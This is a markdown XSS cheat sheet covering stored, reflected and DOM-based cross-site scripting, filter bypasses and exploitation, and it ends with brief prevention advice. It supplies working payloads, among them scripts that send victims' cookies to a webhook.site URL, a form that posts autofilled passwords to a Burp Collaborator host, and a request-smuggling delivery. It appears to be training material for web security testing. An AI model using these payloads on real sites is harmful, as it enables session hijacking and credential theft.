# Cross Side Scripting

Cross-Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker injects malicious scripts into a web page, which is then executed by unsuspecting users. This allows the attacker to steal data, hijack user sessions, or perform various malicious actions on the victim's behalf.

### Type of XSS

- [verify XSS](#verify-xss)
- [stored XSS](#stored-xss)
- [reflected XSS](#reflected-xss)
    - [find reflected XSS](#how-to-find-and-test-for-reflected-xss-vulnerabilities)
- [DOM-based XSS](#dom-based-xss)
    - [Common Sources](#common-sources)
    - [Sinks DOM-BASED vuln](#sinks-dom-based-vulnerabilities)
    - [innerHTML with onerror](#innerhtml-with-onerror)
    - [DOM XSS Jquery](#dom-xss-in-jquery)
		- [attr](#attr)
   		- [selector function](#selector-func)
    - [Dom based Angular](#dom-xss-angularjs)

### Context

- [XSS between HTML tags](#xss-between-html-tags)
- [XSS in HTML tag attributes](#xss-in-html-tag-attributes)
- [Xss into Javascript](#xss-into-javascript)
    - [breaking out of js string](#breaking-out-of-a-javascript-string)
    - [bypass restricted char](#bypass-restricted-char)
		- [explaination](#explaination)
   		- [docu](#docu)
    - [Making use of HTML-encoding](#making-use-of-html-encoding)
    - [XSS in JavaScript template literals (backstiks string)](#xss-in-javascript-template-literals)

### Exploiting XSS

- [Steal cookie](#exploiting-cross-site-scripting-to-steal-cookies)
- [capture password](#exploiting-cross-site-scripting-to-capture-passwords)
- [Deliver Exploit](#deliver-exploit)
 - [Send user to a malicious website](#send-user-to-a-malicious-website)
 - [Exploiting HTTP request smuggling](#using-http-request-smuggling)

### Others
- [Dangling markup injection](#dangling-markup-injection)
- [Prevent XSS attack](#prevent-xss)

## Verify XSS

```js
<script>alert(document.cookie)</script>
```

## Stored Xss

Stored Cross-Site Scripting (XSS) attacks, often referred to as "persistent XSS", are a type of web vulnerability where malicious scripts are injected and stored on a web application's server. These scripts are then served to other users who visit the affected web page.

- [steal cookie](#steal-cookie)

### Steal cookie

The idea is to infect the web page so that when a user logs in, we steal their cookies. If it's the admin, we can then take control of the website.

#### Exploit with webhook

goto [WebHook website](https://webhook.site/) to get a https to redirect users and see their cookies.

```js
<script>document.location='	https://webhook.site/...?c=' + document.cookie</script>
```

## Reflected XSS

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:

```html
<p>You searched for: gift</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

```html
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>
```

This URL results in the following response:

```html
<p>You searched for: <script>/* Bad stuff here... */</script></p>
```

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.

### How to find and test for reflected XSS vulnerabilities

- Test every entry point:This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers.
- Submit random alphanumeric values.For each entry point, submit a unique random value and determine whether the value is reflected in the response.
- Determine the reflection context.  For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
- Test a candidate payload. Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response.
- Test alternative payloads. If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed.

## DOM-based XSS

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

### Common sources

The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:

```js
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

### Sinks DOM-based vulnerabilities

The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one. For a more comprehensive list of relevant sinks:

vulnerability | js
--- | ---
DOM XSS | `document.write()`
[Open redirect](/web/client-side/open-Redirect.md) | `window.location`
Cookie Manipulation | `document.cookie`
[JS injection](/language/java-script/DOM-based-js-injection.md) | `eval()`
[Document domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation) | `document.domain`
[WebSocket-URL poisoning](/web/server-side/websocket.md) | `WebSocket()`
[LinK manipulation](https://portswigger.net/web-security/dom-based/link-manipulation) | `element.src`
[Web message manipulation](/web/client-side/xss/web-message.md) | `postMessage()`
[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation) | `setRequestHeader()`
[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation) | `FileReader.readAsText()`
[Client-side SQL injection](/language/sql/README.md) | `ExecuteSql()`
[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation) | `sessionStorage.setItem()` && `localStorage.setItem()`
[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection) | `document.evaluate()` && `element.evaluate()`
[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection) | `JSON.parse()`
[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation) | `element.setAttribute()`
[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service) | `RegExp()` && `requestFileSystem()`

### innerHTML with onerror

```js
?search=<img src="1" onerror=alert(1)>
```

### DOM XSS in jQuery

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page.

#### attr

For instance, jQuery's attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS.

Ex:

```h
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

You can exploit this by modifying the URL so that the location.search source contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's href, clicking on the back link will execute it:

```h
?returnUrl=javascript:alert(document.domain)
```

#### selector func

Another potential sink to look out for is jQuery's $() selector function, which can be used to inject malicious objects into the DOM.

jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the location.hash source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable hashchange event handler, similar to the following:

```h
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

As the hash is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character (#). However, you may still find vulnerable code in the wild.

To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

In this example, the src attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire.

### DOM XSS AngularJS

In angular `{{ code... }}` is the way to execute js and make reference to variables declare in the controler.

If the expression `{{ 1 + 1}}` return 2, it mean you can inject some code.

Angular function have a property `constructor` which is a reference to `Function('function code in string')` method which allow you to create a function.

Example: `{{ $on }}` is a function same as `{{ $eval }}` so we can call:

```h
{{ $eval.constructor("alert(1)") }}
```

Nice we created a malicious function, but we need to call it:

```h
{{ $eval.constructor("alert(1)")() }}
```

Extra add of `()` at the end of the anonymous function we did created call it instantly.

## XSS between HTML tags

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

[payload](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## XSS in HTML tag attributes

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

```HTML
" autofocus onfocus=alert(document.domain) x="
```

[payload](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Xss into Javascript

### Breaking out of a JavaScript string

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:

```
'-alert(document.domain)-'
';alert(document.domain)//
</javascript>
```
### bypass restricted char

Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website.

One way of doing this is to use the throw statement with an exception handler:

- onerror is trigger by a exception and the throw statement allows you to create a custom exception containing an expression which is sent to the onerror handler.

[Insane site to bypass some char](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)

some payloads:

```js
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>{onerror=eval}throw'=alert\x281337\x29'</script>
// The string sent to eval is "Uncaught=alert(1337)"

// this payload work inside a funciont by giving it dead parameters
<script>, x=x=>{throw onerror=alert,1337},toString=x,window+''</script>
// this one got explained under
```

:warning: If ` ` is blocked try tabulation or `/**/`

#### Explaination:

`<script>, x=x=>{throw onerror=alert,1337},toString=x,window+''</script>`

:warning: This payload work by giving dead arg to a function, because dead arg execute expression:

```js
let cal = (a, b) => {
    return a +b;
}
cal(1,3) // equal 4
cal(1,3,3,6,3) // still equal 4
let my_var = 5
cal(1,3,3,my_var=10) // still return 4
console.log(my_var) //print 10
```

First : `throw onerror=alert,1337`

`throw 1,2,3` will throw 3. but it actually execute others value on the list: 

- `throw onerror=alert, 3` : still throw 3 but overwrite the value of onerror to alert function and call it with throwed value

Then : `x=x=>{}` what does it mean ?

it is an anonymous function:

```js
//similar to that
let x = (x) => {

}
//actualy we dont need (x) parameter but, let say () are block u need to find a way to syntaxely write ur function
let x=x=>{}
let x=()=>{}
```

So `x=x=>{throw onerror=alert,1337}` call a defined a function which throw alert(1337), now we need to call it: `toString=x,window+''`

- it assign toString method to our x function, so toString now call x.
- it try to concat window + '' (an empty array) so the method toString is call and boom, it call our x function

#### Docu

- [XSS without parentheses](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

### Making use of HTML-encoding

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

For example, if the XSS context is as follows:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

And the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

```js
&apos;-alert(document.domain)-&apos;
```

The `&apos`; sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

### XSS in JavaScript template literals

:warning: this vulnerability only works with backsticks:

```
`user input here ${usefull var}`
```

This backstiks allow us to this particular expression `{...}`. The embedded expressions: 

- are evaluated
- are normally concatenated into the surrounding text

This can allow us to use this type of payload: 

```js
`${alert(document.domain)}`
```

## Exploiting cross-site scripting vulnerabilities

### Exploiting cross-site scripting to steal cookies

Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

#### Limitation

- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the HttpOnly flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.

#### Exploit

Example of  collecting cookie data with webhooking:

```html
<script>document.location='https://webhook.site/b29c64ea-5fbc-4ba0-9b29-b5eb079a2e3a?c=' + document.cookie</script>

<script>
fetch('https://webhook.site/b29c64ea-5fbc-4ba0-9b29-b5eb079a2e3a', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

CSRF way to write cookie in the comment section:

```html
<script>
    window.addEventListener('DOMContentLoaded', function(){
        var token = document.getElementsByName("csrf")[0].value;
        var data = new FormData();
        data.append('csrf', token);
        data.append('postId', 3);
        data.append('comment', document.cookie);
        data.append('name', 'victime');
        data.append('email', 'get@gmail.com');
        fetch('/post/comment',{
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
</script>
```

### Exploiting cross-site scripting to capture passwords

These days, many users have password managers that auto-fill their passwords. You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.

```HTML
<input name='username' id='username'>
<input type= 'password' name='password' onchange="
if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value)
});">
```

CSRF way to write the password + username in the comment section:

```HTML
<input name='username' id='username'>
<input type= 'password' name='password' onchange="
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    var user = document.getElementsByName('username')[0].value
    data.append('csrf', token);
    data.append('postId', 3);
    data.append('comment', user+'~'+this.value);
    data.append('name', 'victime');
    data.append('email', 'get@gmail.com');
    fetch('/post/comment',{
        method: 'POST',
        mode: 'no-cors',
        body: data
});">
```

### Deliver Exploit

#### Send user to a malicious website

When an event isn't required:

```html
<script>
    location = 'URL'
</script>
```

When an event is required like `onhashchange`:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

When u need to redirect twice the user:

```html
<iframe src="https://vuln-catalog/product?productId=1&'><script>print()</script>" onload="location='https://vuln-catalog/exploit'"></iframe>
```

#### using http request smuggling

[-> smuggling cheat sheet](/web/server-side/request-smuggling.md)

If an application is vulnerable to HTTP request smuggling and also contains reflected XSS, you can use a request smuggling attack to hit other users of the application. This approach is superior to normal exploitation of reflected XSS in two ways:

- It requires no interaction with victim users. You don't need to feed them a URL and wait for them to visit it. You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
- It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.

Request exploiting CL.TE:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

## Dangling markup injection

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

### What is dangling markup injection?

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:

```HTML
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

If you send that:

```html
"><img src='//attacker-website.com?
```

This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close the src attribute, which is left "dangling".

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data.

## Prevent XSS

Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.

In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:

Filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input.

Encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.

Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

### Documentation

- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

[**:arrow_right_hook: Back home**](/README.md)
